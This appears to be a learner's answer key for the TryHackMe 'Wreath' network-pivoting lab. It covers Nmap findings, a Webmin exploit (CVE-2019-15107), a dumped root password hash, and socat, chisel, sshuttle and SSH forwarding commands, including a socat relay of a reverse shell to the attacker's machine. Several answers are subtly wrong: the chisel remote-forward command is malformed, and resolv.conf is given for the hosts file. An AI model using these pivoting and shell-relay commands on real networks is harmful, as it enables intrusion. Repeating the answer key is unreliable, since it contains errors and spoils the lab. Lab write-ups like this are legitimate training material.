### Enumeration
#### How many of the first 15000 ports are open on the target?  
  4  
#### What OS does Nmap think is running?
centos  

#### Open the IP in your browser -- what site does the server try to redirect you to?
https://thomaswreath.thm/

#### Read through the text on the page. What is Thomas' mobile phone number?
+447821548812 

#### Look back at your service scan results: what server version does Nmap detect as running here?
MiniServ 1.890 (Webmin httpd)

#### What is the CVE number for this exploit?
CVE-2019-15107

### Exploitation

#### Run the exploit and obtain a pseudoshell on the target!
#### Which user was the server running as?
root

#### What is the root user's password hash?
i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

#### What is the full path to this file?
/root/.ssh/id_rsa

####  Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
tunneling

#### Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
portfwd

#### What is the absolute path to the file containing DNS entries on Linux?
/etc/resolv.conf

#### What is the absolute path to the hosts file on Windows?
C:\Windows\System32\drivers\etc\hosts

#### How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done


### Proxychains and FoxyProxy
####  What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
socks4 127.0.0.1 4242  
#### What command would you use to telnet through a proxy to 172.16.0.100:23?
proxychains telnet 172.16.0.100 23
#### You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
FP

#### If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
ssh -L 8000:127.0.0.1:80 user@172.16.0.50


### plink.exe
#### What tool can be used to convert OpenSSH keys into PuTTY style keys?
 puttygen

### Socat
####  Which socat option allows you to reuse the same listening port for more than one connection?
reuseaddr

### If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? Use TCP port 8000 for the server listener, and do not background the process.
  ./socat tcp-l:8000 tcp:172.16.0.200:443

#### What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
./socat tcp-l:2222, fork,reuseaddr tcp:172.16.0.100:22 &

### Chisel

#### Use port 4242 for the listener and do not background the process.
./chisel server -p 4242 --reverse

#### What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
./chisel client 172.16.0.200:4242 socks

#### How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
./chisel client 172.16.0.100:3306 R:33060:172.16.0.200 &

#### If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80

### Sshuttle
#### How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
sshuttle -r pwned@172.16.20.7 172.16.0.0/16

#### What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
--ssh-cmd "ssh -i priv_key"

#### You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
-x 172.16.0.100



#### Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?  
2

#### In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)  
100, 150

#### Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?     
150

#### Let's assume that the other host is inaccessible from our current position in the network. Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?  
80,3389,5985  

#### Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
  http

### Pivoting
#### What is the name of the program running the service?  
gitstack

#### Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle: http://IP/ANSWER  Do these default credentials work (Aye/Nay)?    
Nay

#### There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?  
43777
